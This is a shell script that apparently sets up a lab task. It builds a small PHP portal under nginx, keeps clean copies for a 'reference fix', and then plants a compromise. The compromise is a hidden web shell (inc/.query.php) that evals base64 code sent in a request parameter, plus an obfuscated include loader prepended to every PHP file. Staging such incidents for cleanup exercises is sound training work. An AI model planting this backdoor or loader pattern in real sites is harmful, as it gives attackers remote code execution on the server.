#!/bin/bash
set -e
mkdir -p /srv/www/portal/inc
cat > /srv/www/portal/index.php <<'PHP'
<?php require __DIR__ . '/inc/header.php'; ?>
<h1>Portal</h1>
<p>PORTAL-HOME-OK</p>
<?php require __DIR__ . '/inc/footer.php'; ?>
PHP
printf '<?php /* header */ ?>\n<!doctype html><html><body>\n' > /srv/www/portal/inc/header.php
printf '<?php /* footer */ ?>\n</body></html>\n' > /srv/www/portal/inc/footer.php
printf '<?php function portal_version(){ return "1.0"; } ?>\n' > /srv/www/portal/inc/lib.php
echo 'body{margin:0}' > /srv/www/portal/style.css
chown -R apache:apache /srv/www/portal

cat > /etc/nginx/conf.d/portal.conf <<'CONF'
server {
    listen 80 default_server;
    server_name www.portal.example.test;
    root /srv/www/portal;
    index index.php;
    location / { try_files $uri $uri/ /index.php?$args; }
    location ~ \.php$ {
        fastcgi_pass unix:/run/php-fpm/www.sock;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }
}
CONF
systemctl enable --now php-fpm nginx
for i in $(seq 1 20); do [ -S /run/php-fpm/www.sock ] && break; sleep 0.5; done

# clean copies for the reference fix only
mkdir -p /root/.lt-clean
cp -a /srv/www/portal/. /root/.lt-clean/

# --- the compromise: prepend an obfuscated loader to every original PHP file,
#     and drop the payload it calls (a dormant web shell)
PAYLOAD='/srv/www/portal/inc/.query.php'
printf '<?php if(isset($_REQUEST["q"])){@eval(base64_decode($_REQUEST["q"]));} ?>\n' > "$PAYLOAD"
LOADER='<?php @include_once(__DIR__ . "/.query.php"); /*x*/ @error_reporting(0); ?>'
# the loader references the payload by a relative path from inc/, so inject the right prefix per depth
inject() { local f="$1" rel="$2"; local tmp; tmp=$(mktemp); printf '%s\n' "${LOADER/.query.php/$rel}" > "$tmp"; cat "$f" >> "$tmp"; mv "$tmp" "$f"; chown apache:apache "$f"; }
inject /srv/www/portal/index.php       'inc/.query.php'
inject /srv/www/portal/inc/header.php  '.query.php'
inject /srv/www/portal/inc/footer.php  '.query.php'
inject /srv/www/portal/inc/lib.php     '.query.php'
chown -R apache:apache /srv/www/portal
